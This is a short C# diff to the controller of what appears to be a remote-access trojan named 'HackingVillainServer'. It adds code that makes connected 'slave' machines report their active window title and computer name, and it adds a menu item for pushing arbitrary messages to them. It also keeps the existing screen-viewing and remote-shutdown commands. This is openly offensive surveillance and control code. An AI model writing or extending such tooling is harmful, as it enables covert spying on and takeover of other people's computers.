@@ -113,9 +113,18 @@ namespace HackingVillainServer
                     viewer.Show();
                 });
             }
-            if (type == 2) // 맨 위 창
+            if (type == 2) // 정보
             {
-                _clients[0].CurrentWindow = Encoding.UTF8.GetString(bytes);
+                var data = Encoding.UTF8.GetString(bytes);
+                var window = data.Split('\n')[0];
+                var name = data.Split('\n')[1];
+                _clients[0].CurrentWindow = window;
+                _clients[0].ComputerName = name;
+                this.Invoke(new MethodInvoker(() =>
+                {
+                    SlaveViewer viewer = new SlaveViewer(_clients[listView1.SelectedItems[0].Index]);
+                    viewer.Show();
+                }));
             }
             if (type == 3)
             {
@@ -217,17 +226,11 @@ namespace HackingVillainServer
             Send("Show Me The Screen");
             _ViewrClosed = false;
         }
-        
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            Send("Current Window");
-        }
 
         private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
         {
             if (listView1.SelectedItems.Count != 1) return;
-            SlaveViewer viewer = new SlaveViewer(_clients[listView1.SelectedItems[0].Index]);
-            viewer.Show();
+            Send("Info");
         }
 
         private void 종료KToolStripMenuItem_Click(object sender, EventArgs e)
@@ -237,6 +240,17 @@ namespace HackingVillainServer
             {
                 Send("Shutdown");
             }
+        }
+
+        private void 메시지ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var msgForm = new InputMessage();
+            msgForm.Completed += s =>
+            {
+                Send($"Message {s}");
+                msgForm.Close();
+            };
+            msgForm.Show();
         }
     }
 }
